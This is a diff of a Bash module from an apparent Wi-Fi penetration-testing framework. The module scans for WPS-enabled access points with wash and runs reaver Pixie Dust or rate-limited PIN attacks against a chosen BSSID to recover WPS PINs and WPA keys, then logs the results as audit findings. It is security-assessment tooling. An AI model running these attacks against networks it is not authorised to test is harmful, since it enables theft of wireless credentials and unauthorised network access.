@@ -13,94 +13,83 @@
 #===============================================================================
 #  modules/d3_wps_testing.sh
 #  D3: WPS Vulnerability Testing (Golden Wrapper)
-#
-#  METHODOLOGY (SPEC ALIGNED):
-#  1. Scan for WPS-enabled APs using 'wash'.
-#  2. Interactive selection: Pixie Dust (Fast) vs Online Brute-Force (Loud).
-#  3. Optional: Configure delay/rate-limiting to bypass lockouts.
-#  4. Smart Exit upon successful recovery.
 #===============================================================================
 
 set -euo pipefail
 
-C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
-C_VAR="${ASTRA_COLOR_VAR:-}"
-C_BOLD="${ASTRA_COLOR_BOLD:-}"
-C_ACTION="${ASTRA_COLOR_ACTION:-}"
-C_RESET="${ASTRA_COLOR_RESET:-}"
-
-
 # Inputs from Environment
-
+INTERFACE="${MONITOR_INTERFACE:-}"
+BSSID="${GUEST_BSSID:-}"
+CHANNEL="${GUEST_CHANNEL:-}"
+SCAN_TIME="${SCAN_TIME:-60}"
+SESSION_DIR="${SESSION_DIR:-.}"
+EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
+ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
+TC_ID="D3"
+WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
+INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
 WPS_ATTACK="${WPS_ATTACK:-1}"
-WPS_DELAY="${WPS_DELAY:-}"# ...
+WPS_DELAY="${WPS_DELAY:-}"
 
 if [[ -z "$INTERFACE" ]]; then
     echo "[!] MONITOR_INTERFACE not set."
     exit 1
 fi
 
-# 1. Scan Phase
-echo -e "${C_PROMPT}[*]${C_RESET} Scanning for WPS-enabled networks..."
-WASH_FILE="${EVIDENCE_DIR}/${TC_ID}_wash_results.txt"
+echo "[*] Starting WPS vulnerability audit..."
+
+# 1. Start Telemetry in Background
+(
+    ELAPSED=0
+    while true; do
+        PCT=$(( 10 + (ELAPSED % 85) ))
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing WPS audit..."
+        sleep 5; ELAPSED=$((ELAPSED + 5))
+    done
+) &
+TEL_PID=$!
+
+# 2. Run Primary Tools (wash + reaver)
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    # Foreground Execution
     timeout 30 wash -i "$INTERFACE" 2>&1 | tee "$WASH_FILE" || true
+    if [[ -n "$BSSID" ]]; then
+        REAVER_ARGS="-i $INTERFACE -b $BSSID"
+        [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
+        if [[ "$WPS_ATTACK" == "1" ]]; then
+            REAVER_ARGS+=" -K 1"
+        fi
+        [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
+        timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" || true
+    fi
+    RET=$?
 else
-    timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
+    # Background Execution
+    (
+        timeout 30 wash -i "$INTERFACE" > "$WASH_FILE" 2>&1 || true
+        if [[ -n "$BSSID" ]]; then
+            REAVER_ARGS="-i $INTERFACE -b $BSSID"
+            [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
+            if [[ "$WPS_ATTACK" == "1" ]]; then
+                REAVER_ARGS+=" -K 1"
+            fi
+            [[ -n "$WPS_DELAY" ]] && REAVER_ARGS+=" -d $WPS_DELAY"
+            timeout "$SCAN_TIME" reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 || true
+        fi
+    ) > /dev/null 2>&1 &
+    TOOL_PID=$!
+    wait $TOOL_PID; RET=$?
 fi
 
-# 2. Tactical Selection
+# 3. Cleanup and Final Signal
+kill $TEL_PID 2>/dev/null || true
+
+# Reporting
 if [[ -n "$BSSID" ]]; then
-    echo -e "${C_PROMPT}[?]${C_RESET} ${C_BOLD}Select WPS Attack Vector for ${C_VAR}${BSSID}${C_RESET}:"
-    echo "    1) Pixie Dust (Fast, 1 transaction)"
-    echo "    2) Online Brute-Force (Sequential guessing)"
-attack_choice="${WPS_ATTACK:-1}"
-
-    REAVER_ARGS="-i $INTERFACE -b $BSSID"
-    [[ -n "$CHANNEL" ]] && REAVER_ARGS+=" -c $CHANNEL"
-
-    if [[ "$attack_choice" == "1" ]]; then
-        echo -e "${C_PROMPT}[*]${C_RESET} Initializing Pixie Dust attack..."
-        REAVER_ARGS+=" -K 1"
-    else
-delay="${WPS_DELAY:-}"
-        [[ -n "$delay" ]] && REAVER_ARGS+=" -d $delay"
-        echo -e "${C_PROMPT}[!]${C_RESET} ${C_BOLD}WARNING: Online brute-force is loud and will trigger WIDS.${C_RESET}"
-    fi
-
-    echo "[*] Starting reaver with tactical parameters..."
-    INFO_FILE="${EVIDENCE_DIR}/${TC_ID}_reaver_info.txt"
-    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        reaver $REAVER_ARGS -vv 2>&1 | tee "$INFO_FILE" &
-    else
-        reaver $REAVER_ARGS -vv > "$INFO_FILE" 2>&1 &
-    fi
-    REAVER_PID=$!
-    
-    # 3. Smart Exit Polling
-    ELAPSED=0
     SUCCESS=0
-    while [[ $ELAPSED -lt $SCAN_TIME ]]; do
-        PERCENT=$(( ELAPSED * 100 / SCAN_TIME ))
-        STATUS="Testing WPS... ($(( SCAN_TIME - ELAPSED ))s left)"
-        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PERCENT" --status "$STATUS"
-
-        if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE"; then
-            echo "[!] SUCCESS: WPS DATA RECOVERED!"
-            SUCCESS=1
-            break
-        fi
-        if ! kill -0 "$REAVER_PID" 2>/dev/null; then
-            echo "[*] Reaver process terminated."
-            break
-        fi
-        sleep 5
-        ((ELAPSED+=5))
-    done
-    
-    kill "$REAVER_PID" 2>/dev/null || true
-    wait "$REAVER_PID" 2>/dev/null || true
-    
+    if grep -qiE "WPA PSK|WPS PIN" "$INFO_FILE" 2>/dev/null; then
+        SUCCESS=1
+    fi
     if [[ $SUCCESS -eq 1 ]]; then
         "$ASTRA_BIN" record-finding \
             --session-dir "$SESSION_DIR" \
@@ -112,7 +101,6 @@ delay="${WPS_DELAY:-}"
             --evidence "$INFO_FILE" \
             --rationale "Successful WPS exploitation bypasses the need for complex handshake cracking."
     else
-        echo "[+] WPS audit complete. No data recovered in this window."
         "$ASTRA_BIN" record-finding \
             --session-dir "$SESSION_DIR" \
             --tc "$TC_ID" \
@@ -124,8 +112,7 @@ delay="${WPS_DELAY:-}"
             --rationale "Attack failure suggests AP hardening or rate-limiting."
     fi
 else
-    # General report
-    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE")
+    WPS_COUNT=$(awk 'NR>2 {count++} END {print count+0}' "$WASH_FILE" 2>/dev/null || echo 0)
     "$ASTRA_BIN" record-finding \
         --session-dir "$SESSION_DIR" \
         --tc "$TC_ID" \
@@ -134,8 +121,8 @@ else
         --severity INFO \
         --desc "Identified ${WPS_COUNT} networks with WPS enabled." \
         --evidence "$WASH_FILE" \
-        --rationale "WPS status identifies high-risk targets for further assessment."
+        --rationale "WPS status identifies high-risk targets."
 fi
 
-exit 0
-it 0
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
+exit $RET
